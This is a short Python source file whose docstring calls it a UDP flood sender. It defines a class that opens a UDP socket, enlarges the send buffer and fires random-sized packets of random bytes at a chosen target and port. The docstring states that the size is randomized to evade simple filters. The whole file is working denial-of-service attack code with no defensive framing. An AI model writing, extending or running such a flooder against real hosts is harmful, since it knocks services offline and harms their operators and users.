"""UDP flood sender. Payload size is randomized to defeat trivial filters."""
from __future__ import annotations

import os
import random
import socket


class UdpHandler:
    def __init__(self, min_payload: int = 64, max_payload: int = 1400) -> None:
        self._min = min_payload
        self._max = max_payload
        self._sock: socket.socket | None = None

    def open(self) -> None:
        if self._sock is None:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if hasattr(socket, "SO_SNDBUF"):
                self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)

    async def send(self, target: str, port: int) -> tuple[int, int]:
        if self._sock is None:
            self.open()
        size = random.randint(self._min, self._max)
        payload = os.urandom(size)
        try:
            self._sock.sendto(payload, (target, port))  # type: ignore[union-attr]
            return 1, size
        except OSError:
            return 0, 0

    def close(self) -> None:
        if self._sock is not None:
            self._sock.close()
            self._sock = None